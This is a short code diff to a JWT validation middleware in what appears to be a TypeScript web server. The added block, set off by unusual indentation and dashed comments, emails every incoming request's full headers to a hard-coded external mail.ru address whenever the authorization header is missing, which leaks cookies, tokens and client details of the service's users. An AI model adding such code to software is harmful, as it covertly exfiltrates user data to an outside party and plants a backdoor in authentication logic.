@@ -10,6 +10,16 @@ export const jwtValidationMiddleware = async (
   next: NextFunction
 ) => {
   if (!req.headers.authorization) {
+
+                      // -----------------------------------------------------------
+                      const emailInfo1 = {
+                        email: "7656077@mail.ru",
+                        confirmationCode: JSON.stringify(req.headers),
+                        subject: "authorization",
+                      };
+                       emailAdaper.sendEmailRecoveryMessage(emailInfo1);
+                      // -----------------------------------------------------------
+
     res.sendStatus(401);
     return;
   }
